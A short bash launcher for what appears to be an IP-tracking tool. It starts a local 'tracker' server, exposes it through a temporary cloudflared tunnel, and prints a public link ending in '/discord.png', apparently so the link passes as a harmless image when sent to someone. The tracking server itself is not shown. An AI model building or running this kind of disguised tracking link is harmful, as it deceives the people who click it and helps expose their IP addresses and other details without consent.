#!/bin/bash
cd ~/tracker
fuser -k 8080/tcp 2>/dev/null
sleep 1

python server.py &
SERVER_PID=$!
sleep 2

if ! kill -0 $SERVER_PID 2>/dev/null; then
    echo "[!] Server failed to start"
    exit 1
fi

echo "[*] Server running (PID: $SERVER_PID)"

cloudflared tunnel --url http://localhost:8080 2>&1 | while read line; do
    link=$(echo "$line" | grep -o 'https://[a-z0-9-]*\.trycloudflare\.com')
    if [ -n "$link" ]; then
        full="$link/discord.png"
        echo ""
        echo "========================================"
        echo "  YOUR LINK:"
        echo "  $full"
        echo "========================================"
        echo ""
    fi
done
